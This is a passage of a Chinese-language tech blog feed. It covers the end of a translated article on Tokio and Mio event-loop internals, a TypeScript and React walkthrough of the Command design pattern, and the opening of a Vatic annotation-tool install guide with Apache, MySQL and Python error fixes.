在這個作法中，task 的通知將轉換為 Mio 事件，且可以透過 Tokio 的事件處理與分派機制與其他 Mio 事件作伙處理。
如同 Mio 封裝 std::net 內的 UdpSocket、TcpListener，以及 TcpStream 來客製化需求，Tokio 也利用了組合（composition）與裝飾（decoration）建立這些型別的 Tokio 版。舉例來說，Tokio 的 UdpSocket 架構大致如下：

Tokio 版本的 I&#x2F;O 來源型別的建構子都需要傳入 event loop 的 handle（tokio_core::reactor::Handle）。當實例化時，這些型別會將它們的 socket 註冊至 Mio poll 的 event loop 上，以利接收 edge-triggred（譯注：一種 epoll event 的觸發模式）的事件及其新賦予的偶數數字 token（以下會解釋）。當底層的 I&#x2F;O 操作回傳 WouldBlock 時，這些型別可以很方便地安排當前的 task 來接收讀寫的 readiness。
Tokio 在 Mio 上註冊了許多 Evented 型別，儲存在特定的 token 上：

Token 0（TOKEN_MESSAGES）：用於 Tokio 內部的消息佇列（message queue），這個佇列提供移除 I&#x2F;O 來源、接收讀寫 readiness 通知的 task 排程，設定 timeout，以及執行在 event loop 語彙環境中的任意閉包。這個 token 可以安全地從其他線程與 event loop 溝通。例如，Remote::spawn() 透過訊息系統，將 future 送達 event loop。
  實作上，消息佇列是一個 futures::sync::mpsc stream。身為一個 futures::stream::Stream（與 future 類似，但是產生一序列的值而非單一值），消息佇列使用上述 MySetReadiness 方案來處理，而 Registration 則是以 TOKEN_MESSAGES 這個 token 註冊。當接收到 TOKEN_MESSAGES 事件時，該事件會分派到 consume_queue() 方法進一步處理。（原始碼：enum Message、consume_queue()）

Token 1（TOKEN_FUTURE）：用於通知 Tokio 需要輪詢 main task。這個 token 會在與 main task 相關聯的通知上（也就是傳入 Core::run() 的 future 或它的子 future，而非透過 spawn() 在不同 task 中執行的 future）。這個事件同樣用了 MySetReadiness 方案將 future 轉譯成 Mio 的事件。在一個 future 被 main task 執行前，會先回傳 Async::NotReady，並以其所選的方式在稍後發布通知。當接收了 TOKEN_FUTURE 事件，Tokio event loop 就會再次輪詢 main task。

大於 1 的偶數 token（TOKEN_START + key * 2）：用來指示 I&#x2F;O 來源的 readiness 改變。Token 中的 key 是 Slab key，關聯值是 Core::inner::io_dispatch Slab&lt;ScheduledIo&gt;。當 Mio 的 I&#x2F;O 來源型別（UdpSocket、TcpListener、TcpStream）實例化之初，會自動以此 token 註冊。

大於 1 的奇數 token（TOKEN_START + key * 2 + 1）：用來指示一個 spawned task（及其關聯的 future）需要被輪詢。Token 中的 key 是 Slab key，關聯值是 Core::inner::task_dispatch Slab&lt;ScheduledTask&gt;。和 TOKEN_MESSAGES 與 TOKEN_FUTURE 事件相同，這個事件也用了 MySetReadiness 溝通。


Tokio event loopTokio，更精確來說是 tokio_core::reactor::Core 提供了 event loop 來管理 futures 和 tasks，驅動 future 完成，以及與 Mio 介接的介面，讓 I&#x2F;O 事件可正確通知對應的 task。使用 event loop 需透過 Core::new() 實例化一個 Core，並調用 Core::run() 傳入一個 future。這個 event loop 在返回之前，將會驅動傳入的 future 至完成。以伺服器程式來說（serve application），這個 future 很可能生命週期較長，例如使用 TcpListener 持續接收新傳入的連結，每個連結透過 Handle.spawn() 分別建立 task，由自身的 future 獨立處理。
以下的流程圖大略點出 Tokio event loop 的基本輪廓：

What happens when data arrives on a socket?想了解 Tokio，可以觀察當資料抵達 socket 時，event loop 發生的每個步驟。我很訝異地發現，這個過程最終分為兩部分，分別在 event loop 內各自的迭代中，進行各自的 epoll 交易處理。第一部分負責當 socket 讀取就緒時（例如，Mio 事件帶著比 1 大的偶數 token，或 main task 的 TOKEN_FUTURE），傳送通知到對該 socket 有興趣的 task；第二部分則是透過輪詢 task 與它的 future 來處理通知（例如，Mio 事件帶著比 1 大的奇數 token）。我們來了解以下情境：一個 spawned task 從 Linux 上的 UdpSocket，透過 Tokio event loop 讀取資料，並假設前一次輪詢結果導致 recv_from() 回傳一個 WouldBlock 錯誤。

Tokio event loop 調用 mio::Poll:poll()，該方法轉而調用 epoll_wait()（在 Linux 上）進而阻塞到某個監測中的 file descriptor 發生了 readiness 改變的事件。當上述情形發生後，epoll_wait() 回傳一個 epoll_event structs 的陣列，用以描述發生什麼事，這些 structs 也將透過 Mio 轉譯為 mio::Events，並返回 Tokio。（在 Linux 上，這些轉譯應該是零成本（zero-cost），因為 mio::Events 就只是簡單，以一個 epoll_event 陣列組成的元組結構（tuple struct）。）在我們的例子，假設在陣列中只有一個事件指出 socket 已讀取就緒。由於該事件的 token 是大於 1 的偶數，Tokio 辨識其為 I&#x2F;O 事件，並從 Slab&lt;ScheduledIo&gt; 中尋找對應的元素，以取得有哪些 task 對這個 socket 的讀寫 readiness 狀態有興趣。接下來，Tokio 會通知對讀取有興趣的 task，這些 task 透過前述的 MySetReadiness，調用 Mio 的 set_readiness()。Mio 會將這個非系統的事件詳細資訊加到 readiness 佇列中，並寫入 0x01 到 readiness pipe 中。

在 Tokio event loop 往下一個迭代前進之前，它會再次輪詢 Mio，Mio 則調用 epoll_wait()，而 epoll_wait() 這次返回一個在 Mio 的 readiness pipe 上發生的讀取 readiness 事件。Mio 讀取之前寫入的 0x01，並從 readiness 佇列取出最前端（dequeue）的非系統事件資料，並將這個事件回傳到 Tokio。由於該事件的 token 是大於 1 的奇數 token，Tokio 辨識其為 task 通知事件，並從 Slab&lt;ScheduledTask&gt; 中尋找對應的元素，以取得 task 從 spawn() 回傳的最原始的 Spawn 物件。接下來，Tokio 透過 poll_future_notify() 輪詢這個 task 與它的 future，這個 future 可能會從 socket 讀取資料，直至得到 WouldBlock 錯誤。
這個二迭代的方法涉及了 pipe 讀寫，對比其他非同步 I&#x2F;O event loop，可能會有一點額外開銷。如果在一個單線程的程式中，使用 strace 會看到一個線程用 pipe 與自己溝通，很是奇怪：
pipe2([4, 5], O_NONBLOCK|O_CLOEXEC) = 0...epoll_wait(3, [&#123;EPOLLIN|EPOLLOUT, &#123;u32=14, u64=14&#125;&#125;], 1024, -1) = 1write(5, &quot;\1&quot;, 1) = 1epoll_wait(3, [&#123;EPOLLIN, &#123;u32=4294967295, u64=18446744073709551615&#125;&#125;], 1024, 0) = 1read(4, &quot;\1&quot;, 128) = 1read(4, 0x7ffce1140f58, 128) = -1 EAGAIN (Resource temporarily unavailable)recvfrom(12, &quot;hello\n&quot;, 1024, 0, &#123;sa_family=AF_INET, sin_port=htons(43106), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 6recvfrom(12, 0x7f576621c800, 1024, 0, 0x7ffce1140070, 0x7ffce114011c) = -1 EAGAIN (Resource temporarily unavailable)epoll_wait(3, [], 1024, 0) = 0epoll_wait(3, 0x7f5765b24000, 1024, -1) = -1 EINTR (Interrupted system call)

Mio 選用 pipe 的方案來支持通用性，以防 set_readiness() 可能被其他線程調用。也有可能這種作法對強制實施公平的事件調節與維持 futures 與 I&#x2F;O 的間接層有所幫助。
Lessons learned: Combining futures vs. spawning futures最初探索 Tokio 時，我寫了一個小程式，負責監聽不同 UDP socket 進來的資料。這個程式建立十個讀取 socket 的 future 實例，每個都監聽不同的埠口（port）。我天真地使用 join_all() 將所有 future 合成為單一 future，並將之傳入 Core::run()，訝異的是，我發現每當一個封包送達，所有 future 都會輪詢一次。另一個驚訝的點是，tokio_core::net:UdpSocket::recv_from()（以及底層的 PollEvented）非常聰明，當 socket 在前一次的 Mio 輪詢中尚未標記為讀取就緒時，會避免調用作業系統 rectfrom()。以下的 strace 反映出我寫的 future poll() 的除錯 println!()，大致如下：
epoll_wait(3, [&#123;EPOLLIN|EPOLLOUT, &#123;u32=14, u64=14&#125;&#125;], 1024, -1) = 1write(5, &quot;\1&quot;, 1) = 1epoll_wait(3, [&#123;EPOLLIN, &#123;u32=4294967295, u64=18446744073709551615&#125;&#125;], 1024, 0) = 1read(4, &quot;\1&quot;, 128) = 1read(4, 0x7ffc183129d8, 128) = -1 EAGAIN (Resource temporarily unavailable)write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21recvfrom(12, &quot;hello\n&quot;, 1024, 0, &#123;sa_family=AF_INET, sin_port=htons(43106), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 6getsockname(12, &#123;sa_family=AF_INET, sin_port=htons(2006), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 0write(1, &quot;recv 6 bytes from 127.0.0.1:43106 at 127.0.0.1:2006\n&quot;, 52) = 52recvfrom(12, 0x7f2a11c1c400, 1024, 0, 0x7ffc18312ba0, 0x7ffc18312c4c) = -1 EAGAIN (Resource temporarily unavailable)write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21epoll_wait(3, [], 1024, 0) = 0epoll_wait(3, 0x7f2a11c36000, 1024, -1) = ...

有鑑於 Tokio 與 futures 的具體內部運作某個程度上對我來說有點隱晦，我想我希望背後有些魔法路由，可以只輪詢必要的 futures。當然，對 Tokio 有更深入的理解後，我的程式很明顯這樣利用 futures：

這的確可以執行，但不夠好，尤其是當你有一拖拉庫 socket 時。由於通知在 task 層級發生，上圖中任意一個綠色方格中通知都會導致 main task 被通知。它將會輪詢 FromAll future 使得所有 FromAll 的 child future 都須接受輪詢。我真正需要的是一個簡單的 main future，使用 Handle::spawn() 來啟動每個封裝在各自的 task 中的 future。這種安排大致如下圖：

當任何 future 安排一個通知，只有該 future 的 task 會收到通知，也只有該 future 會被輪詢（回想一下，「安排一個通知」會自動發生在 tokio_core::net:UdpSocket::rect_from() 從 mio::net::UdpSocket::rect_from() 回傳值中接收到 WouldBlock ）。future 組合操作子敘述表達能力強勁，可好整以暇地描述協議（protocol）的流程而不須弄髒手寫手動輪詢的狀態機。然而重要的是，你必須理解你的設計也許需要支援各自獨立，獨自且並行運作的 tasks。（譯注：而非都在 main task 上使用 join_all()）
Final thoughts閱讀 Tokio、Mio 以及 futures 原始碼後，大大幫助我鞏固對 Tokio 的理解，也驗證了透過理解具體實作來釐清抽象層的學習策略。這個方法在僅僅學習抽象層的狹隘使用案例時非常危險，我們必須意識到具體的示例僅是助於理解一般通例。在閱讀完原始碼之後，再次閱讀 Tokio 的教學文件，我有些馬後炮的意見：Tokio 非常合理，應該要很容易理解與上手！
我仍有些問題待日後研究：

Tokio 有處理 edge triggering（Linux epoll）的飢餓問題（starvation problem）嗎？我認為這個問題可以在 future 中，以單一一個 poll() 限制讀 &#x2F; 寫的數量。當達到這個限制時，future 可以在顯式通知當前 task 提前返回，而非依靠 Tokio I&#x2F;O 來源類型的隱式「WouldBlock 排程」行為。因此這使得其他 task 與 future 有機會有所進展。
Tokio 是否不依賴於將工作卸載給工作線程（worker thread）以最大化處理器核心運用，而是直接支援多線程環境下執行 event loop 嗎？


2017-12-19 更新：這裡有 Reddit 對話串討論本文。Mio 的作者 Carl Lerche 在這裡和這裡貼了些資訊量充足的留言。除了回應上述問題，他也點出 FuturesUnordered 是一種合成 futures 的方法，只有相關的 child future 會被輪詢，以避免所有 future 像使用 join_all() 全部輪詢，不過這方法有些額外的記憶體配置開銷要衡量。另外，未來的 Tokio 將要遷離 mio::Registration 的通知方案，目的是簡化前述一些步驟。


2017-12-21 更新：看起來 Hacker News 也有在討論這篇文章。

關於譯者：@weihanglo 掛著 iOS 工程師之名，行開發 Web App 之實。
]]></content>
      <tags>
        <tag>Rust, Tokio, Asynchronous I/O, Translation</tag>
      </tags>
  </entry>
  <entry>
    <title>用 TypeScript 輕鬆學 Design pattern - Command Pattern</title>
    <url>/2019/03/31/typescript-design-pattern-command/</url>
    <content><![CDATA[前言雖然直到最近才實際在工作上使用 TypeScript 進行開發，但是早在去年就有斷斷續續在自己的 side project 上玩玩 TypeScript，剛好後來公司讀書會在研讀經典的 Design Pattern 書籍，就索性使用 TypeScript 來製作範例，意外發現 TypeScript 在講解一些 Design Pattern 的時候非常適合，不僅能夠有類別、物件等清楚的表示，也能夠直接在網頁上做出會動的範例。
雖然這是蠻久之前製作的，但最近想想還是可以分享一下！所以今天就以 TypeScript 來製作範例，為大家講解 Command Pattern！
Command Pattern在 GoF Design Patterns（也就是 Design Patterns: Elements of Reusable Object-Oriented Software 這本書）中 Command Pattern 屬於 Behavioural Patterns 的一種，主要是定義類別與物件之間的溝通與互動方法。
Command Pattern 的初衷，是希望能將各種對物件的操作（request）也都獨立包裝成物件，如此一來，這個 request，就能夠在各個物件對象之間傳遞，甚至提供 undoable 的 operation。
我們可以從 UML 圖來理解：

By Sae1962 - Own work, CC BY-SA 4.0, Link

Command

定義出一個 Command 介面，用來執行操作，該介面只需要定義一個 Execute() 這個抽象 method。


Concrete Command

從抽象的 Command 介面所實作的 Concrete Command，會實作該 Command 實際上要執行的動作內容，也就是實作 Execute()，此外，他還需要負責將 接收操作的物件（receiver） 與 動作（Action）本身連結起來。簡單來說，就是他會被傳遞進一個物件，並且在 Execute() 函數中，trigger receiver 執行相對的動作。這邊值得注意的是，Concrete Command 本身並不管也不知道 receiver 會怎麼實作他們的 action，他只需要告訴 receiver 他想要完成的是什麼命令即可。


Client

負責創建 Concrete Command，並指定其 receiver。


Invoker

就是下達指令的人，負責呼叫 Command。


Receiver

知道接受到 Command 時，要執行什麼動作（Action）的人。



光看 UML，一定還不太清楚，接著我們從 sequence diagram 來看看這幾個對象彼此之間如何互動：

可以想像，Receiver 就是餐廳服務生，而 Client 就是顧客，顧客會知道要對服務生下達指令，所以會產生 new Command(Receiver)；但他可能需要透過服務鈴（Invoker)，才能讓服務生真正去執行他的指令。
接著我們先來看看實際的範例。
TypeScript 實作範例

當顧客點選 “Give me food” 按鈕時，服務生就會接收到指令，並趕緊去找廚師；而當顧客想更改餐點時，可以透過 “Hey get back”，下達指令來回復服務生的上一個動作。
很簡單暴力的範例吧XD
實際上的程式怎麼寫呢？
首先我們先從定義 Command 介面開始：
export class Command &#123;  public execute(): void &#123;    throw new Error(&quot;Abstract method!&quot;);  &#125;  public unexecute(): void &#123;    throw new Error(&quot;Abstract method!&quot;);  &#125;&#125;

如同先前 UML 圖所描述，我們只定義抽象的 execute() method，在 TypeScript 中要模擬抽象方法的最簡單做法就是讓他 throw Error。另外我們同時也定義一個 unexecute()，作為回復的操作。


[2019&#x2F;04&#x2F;22 - Update]
感謝 @pilagod 的補充，TypeScript 有提供 Abstract 類別，可以強迫繼承者去實作其抽象函數，所以我們的 Command class 可以寫成：
export abstract class Command &#123;  abstract execute(): void;  abstract unexecute(): void;&#125;



import * as React from &quot;react&quot;;import &#123; Waiter &#125; from &quot;./Waiter&quot;;export class ConcreteOrderCommand extends Command &#123;  private receiver: React.RefObject&lt;Waiter&gt;;  private position: number;  constructor(receiver: React.RefObject&lt;Waiter&gt;) &#123;    super();    this.receiver = receiver;    this.position = 0;  &#125;  public execute(): void &#123;    console.log(&quot;`execute` method of ConcreteOrderCommand is being called!&quot;);    this.position = 300;    this.receiver.current.action(this.position);  &#125;  public unexecute(): void &#123;    console.log(&quot;`execut` method of ConcreteOrderCommand is being called!&quot;);    this.position = 0;    this.receiver.current.backAction(this.position);  &#125;&#125;

再來實作 ConcreteCommand，我們 extend 抽象的 Command 類別，指定兩個私有變數：receiver 與 position。
receiver 可以從其宣告的類別看出，就是 Waiter，這就是 TypeScript 適合說明 Design Pattern 的優點之一，可以很明確看到關聯性，我們待會會看到 Waiter 的實作。而 position 則是範例中我們用在 execute() 中，告訴 receiver 該如何 action 的工具，在範例中就是改變 Waiter 的位置。
在 ConcreteCommand 的 execute() 實作中，我們定義出 “這個 Command” 要讓 “其受指定的 receiver” 進行怎樣的 “action”，也就是這行：
this.receiver.current.action(this.position);
我們告訴 receiver 說，請依照 this.position 這個參數去執行你的 action，但記住，你的 action 到底是怎麼實作的我並不管你。
（這邊跟 React 相關的不做太多解釋，基本上因為我們需要在 ConcreteCommand 中去呼叫 receiver 的 action method，所以採用 React.RefObject&lt;T&gt; 作為 receiver 的類型，這樣我們能透過 .current 的 API 去取得 React 實體。）
看到這邊可以發現，由於我們並不需要知道 receiver 本身怎麼實作 action，所以關注點可以分離，只要管好自己這邊如何呼叫 receiver 即可。
到這邊為止，我們已經實作完 UML 中的 Command 介面與 ConcreteCommand 了，接著輪到 Receiver：
import * as React from &quot;react&quot;;const waiterStyle = &#123;  display: &quot;flex&quot;,  flexDirection: &quot;column&quot;,  alignItems: &quot;center&quot;,  transition: &quot;all 1s ease-in-out&quot;&#125;;type WaiterProps = &#123;  ref: React.RefObject&lt;Waiter&gt;;&#125;;type WaiterState = &#123;  position: number;&#125;;export class Waiter extends React.Component&lt;WaiterProps, WaiterState&gt; &#123;  constructor(props: any) &#123;    super(props);  &#125;  state = &#123;    position: 0  &#125;;  action = (position: number) =&gt; &#123;    console.log(&quot;command action!&quot;);    this.setState(&#123;      position    &#125;);  &#125;;  backAction = (position: number) =&gt; &#123;    console.log(&quot;command back action!&quot;);    this.setState(&#123;      position    &#125;);  &#125;;  render() &#123;    const &#123; position &#125; = this.state;    return (      &lt;div style=&#123;&#123; ...waiterStyle, transform: `translateX($&#123;position&#125;px)` &#125;&#125;&gt;        &lt;img          width=&quot;100px&quot;          src=&quot;https://image.flaticon.com/icons/svg/816/816577.svg&quot;        /&gt;      &lt;/div&gt;    );  &#125;&#125;

Receiver 也很簡單，重點在於實作 action。以範例來說，我們會從 ConcreteCommand 接收到新的 position state，所以我們要執行的動作就是 this.setState(&#123; position &#125;)，將自身的狀態改變。透過 TypeScript，可以清楚定義 state 與 props 的型別。
Waiter 需要接收一個 ref: React.RefObject&lt;Waiter&gt;; 的 Props，則是與 React 實作相關，因為我是利用 const WaiterRef = React.createRef&lt;Waiter&gt;(); 將 Waiter 的 ref 傳遞給 ConcreteCommand。（可參考 Codesandbox 內的完整程式碼）
最後，有了指令（ConcreteCommand），有了接收指令的人（Waiter），我們來看看 Customer 要如何使用指令來呼叫 Waiter 吧：
// 有刪除一些不重要的 code，i.e. style, etc.import * as React from &quot;react&quot;;import &#123; Waiter &#125; from &quot;./Waiter&quot;;import &#123; Command, ConcreteOrderCommand &#125; from &quot;./CommandPattern&quot;;type CustomerProps = &#123;  WaiterRef: React.RefObject&lt;Waiter&gt;;&#125;;type CustomerState = &#123;  orderCommand: Command;&#125;;export class Customer extends React.Component&lt;CustomerProps, CustomerState&gt; &#123;  constructor(props: any) &#123;    super(props);    const &#123; WaiterRef &#125; = props;    this.state = &#123;      orderCommand: new ConcreteOrderCommand(WaiterRef)    &#125;;  &#125;  render() &#123;    return (      &lt;div style=&#123;CustomerStyle&#125;&gt;        &lt;div          onMouseEnter=&#123;() =&gt; this.setState(&#123; btn1OnHover: true &#125;)&#125;          onMouseLeave=&#123;() =&gt; this.setState(&#123; btn1OnHover: false &#125;)&#125;          onClick=&#123;() =&gt; &#123;            this.state.orderCommand.execute();          &#125;&#125;        &gt;          Give me food!!        &lt;/div&gt;        &lt;div          onMouseEnter=&#123;() =&gt; this.setState(&#123; btn2OnHover: true &#125;)&#125;          onMouseLeave=&#123;() =&gt; this.setState(&#123; btn2OnHover: false &#125;)&#125;          onClick=&#123;() =&gt; &#123;            this.state.orderCommand.unexecute();          &#125;&#125;        &gt;          Hey get back!!        &lt;/div&gt;      &lt;/div&gt;    );  &#125;&#125;

基本上 Customer 就是會保有 ConcreteCommand 在 state 當中，這樣才能合理的不斷下達指令。
另外也需要取得 WaiterRef 這個 props，才能在初始 ConcreteCommand 時指定其 receiver。
接著我們只要在不同功能的 button 上綁定 command 即可，分別呼叫 this.state.orderCommand.execute(); 與 this.state.orderCommand.unexecute();。
如此一來，我們就成功用 TypeScript 實作一個完整的 Command Pattern 範例啦！（完整的程式碼請看上方 CodeSandbox 連結）
Command Pattern 的 Consequences
Command Pattern 將呼叫指令的物件與執行指令的物件切割開來，降低彼此之間耦合度。
Command 是 first-class objects，可以被傳遞、操作與繼承。
可以 composite 多個 Command 到一個 Command 中，類似巨集概念。
增加 Command 很容易，因為你不需要更改其他的現有 Class。

實作 Command Pattern 上所需要注意的細節
需要思考一個 Command 該擁有多少能力，是要單純作 receiver 與 action 之間的 binding，大部分實作擺在 receiver；抑或是將大多實作自己處理掉，receiver 只是一個命令的受體？
是否需要支援 undo 功能，Command Pattern 設計上天生支援 undo，但實際實作上你可能會需要額外的儲存 state 來達成，會增加開發複雜度。
若是支援 undo，還得注意發生 error 時，會不會不斷累積，難以 debug。

結論TypeScript 現在非常熱門，Design Pattern 則是萬年不敗，兩者搭配起來一起學習可說是天作之合！尤其是平常工作沒有機會碰觸到的話，透過這種方式學習不僅兩者皆能吸收，還能累積點小玩具。
但說起來，TypeScript 的爭議也不少，最近參加了優秀新同事們主辦的幾場 Meetup，再次燃起我對 Elm 的興趣，可惜剛到新環境，瑣事太多，還來不及有個成果分享，不過也算是有點心得，希望之後能夠分享一下。
資料來源
Wiki - Design_Patterns
TypeScript
TypeScript Design Pattern

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>react</tag>
        <tag>Design pattern</tag>
        <tag>Command</tag>
        <tag>TypeScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Vatic 安裝教學</title>
    <url>/2019/03/16/vatic-setup-tutorial/</url>
    <content><![CDATA[前言Vatic 是用來標註影片中 bounding box 的好用工具，因為它提供了 bounding box tracking 的功能，不需要一個一個 frame 去重新標註，所以想用 Machine Learning 學習影片中 bounding box 的人來說是很好用的工具。

因為 vatic 的安裝步驟有一點複雜，所以寫這篇教學提供給需要的讀者朋友。筆者自己有在 Ubuntu 16.04 裝成功，這篇教學主要會 cover 到如何在自己電腦上 locally 跑起來 vatic。
開始安裝首先，大家可以先看看官方 tutorial，裡面的步驟就是我們要做的，只是如果只按照裡面的步驟做，會遇到不少的 error，所以接下來我們會補充一些相關的經驗。
Download官方 tutorial 中會叫大家下載 install.sh 檔，但是他們提供的網址已經無法連上，這邊建議大家可以使用 此連結 裡面的檔案，是熱心的網友幫忙更新過的 installation script，裝起來比較沒有問題。
Apache server setup這邊提供大家一個修改完的 &#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F;000-default.conf 範例：
WSGIDaemonProcess www-dataWSGIProcessGroup www-data&lt;VirtualHost *:80&gt;ServerName localhostDocumentRoot /home/icaros/tool/vatic_home/vatic/publicWSGIScriptAlias /server /home/icaros/tool/vatic_home/vatic/server.pyCustomLog /var/log/apache2/access.log combined&lt;/VirtualHost&gt;

當你改完上面的檔案，想要重新啟動 apache 時，可能會遇到下面的 error:
icaros@icaros-MS-7B61:/etc/apache2/sites-enabled$ sudo apache2ctl graceful[sudo] password for icaros:AH00558: apache2: Could not reliably determine the server&#x27;s fully qualified domain name, using 127.0.1.1. Set the &#x27;ServerName&#x27; directive globally to suppress this message

這時候可以參考這篇回答 - Apache error “Could not reliably determine the server’s fully qualified domain name”，就可以繼續進行。
Database setup當設定完 apache server 後，下一步我們要來設定儲存 annotation 需要用到的 database server。只是，當你按照官方教學的第一步做下去，你就會發現這個 error：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic/public$ mysql -u rootERROR 1045 (28000): Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)

當你遇到這個情況，別擔心，請下 mysql -u root -p，然後密碼請輸入 hail_ukraine，就可以進去 mysql 的命令視窗了：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic/public$ mysql -u root -pEnter password:Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 20Server version: 5.7.25-0ubuntu0.16.04.2 (Ubuntu)Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.mysql&gt;

然後就可以建立 vatic 這個 database 並離開 mysql：
mysql&gt; create database vatic;mysql&gt; quit

Setup接下來要處理 config.py，這邊提供大家一個範例：
signature = &quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot; # AWS secret access keyaccesskey = &quot;xxxxxxxxxxxxxxxxxxxx&quot; # AWS access key IDsandbox = True # if true, put on workersandbox.mturk.comlocalhost = &quot;http://localhost/&quot; # your local hostdatabase = &quot;mysql://root@localhost/vatic&quot; # server://user:pass@localhost/dbnamegeolocation = &quot;d4c08cbcd873067102638cd6f1bf3c5d63ff053a87a4148273159c3ed1493b04&quot; # api key for ipinfodb.commaxobjects = 25;# probably no need to mess below this lineimport multiprocessingprocesses = multiprocessing.cpu_count()import os.pathimport syssys.path.append(os.path.dirname(os.path.abspath(__file__)))

改完上面的範例，執行 turkic setup --database，很可能會遇到下一個 error：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseTraceback (most recent call last):File &quot;/usr/local/bin/turkic&quot;, line 4, in &lt;module&gt;__import__(&#x27;pkg_resources&#x27;).run_script(&#x27;turkic==0.2.5&#x27;, &#x27;turkic&#x27;)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 666, in run_scriptself.require(requires)[0].run_script(script_name, ns)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 1446, in run_scriptexec(code, namespace, namespace)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/EGG-INFO/scripts/turkic&quot;, line 12, in &lt;module&gt;import cliFile &quot;/home/icaros/tool/vatic_home/vatic/cli.py&quot;, line 19, in &lt;module&gt;import qaFile &quot;/home/icaros/tool/vatic_home/vatic/qa.py&quot;, line 1, in &lt;module&gt;from match import matchFile &quot;/home/icaros/tool/vatic_home/vatic/match.py&quot;, line 1, in &lt;module&gt;import munkresFile &quot;/usr/local/lib/python2.7/dist-packages/munkres-1.1.2-py2.7.egg/munkres.py&quot;, line 79def pad_matrix(self, matrix: Matrix, pad_value: int=0) -&gt; Matrix:^SyntaxError: invalid syntax

會遇到這個 error 是因為 munkres 這個 library 在 1.1.0 版之後就不支援 Python 2 了，但 vatic 似乎都是用 Python 2.7 寫的，所以請用 pip install munkres==1.0.12 安裝較舊的版本。
好了，處理完 munkres 之後，你又會遇到下一個 error：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseTraceback (most recent call last):File &quot;/usr/local/bin/turkic&quot;, line 4, in &lt;module&gt;__import__(&#x27;pkg_resources&#x27;).run_script(&#x27;turkic==0.2.5&#x27;, &#x27;turkic&#x27;)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 666, in run_scriptself.require(requires)[0].run_script(script_name, ns)File &quot;/usr/local/lib/python2.7/dist-packages/pkg_resources/__init__.py&quot;, line 1446, in run_scriptexec(code, namespace, namespace)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/EGG-INFO/scripts/turkic&quot;, line 16, in &lt;module&gt;turkic.cli.main()File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 147, in mainhandler(args[1:])File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 47, in __init__self(parser.parse_args(args))File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 470, in __call__self.database(args)File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/cli.py&quot;, line 455, in databasedatabase.install()File &quot;/usr/local/lib/python2.7/dist-packages/turkic-0.2.5-py2.7.egg/turkic/database.py&quot;, line 45, in installBase.metadata.create_all(engine)File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/sql/schema.py&quot;, line 4287, in create_allFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2032, in _run_visitorFile &quot;/usr/lib/python2.7/contextlib.py&quot;, line 17, in __enter__return self.gen.next()File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2024, in _optional_conn_ctx_managerFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2226, in _contextual_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2266, in _wrap_pool_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 1536, in _handle_dbapi_exception_noconnectionFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/util/compat.py&quot;, line 383, in raise_from_causeFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/base.py&quot;, line 2262, in _wrap_pool_connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 354, in connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 751, in _checkoutFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 483, in checkoutFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/impl.py&quot;, line 138, in _do_getFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/util/langhelpers.py&quot;, line 68, in __exit__File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/impl.py&quot;, line 135, in _do_getFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 299, in _create_connectionFile 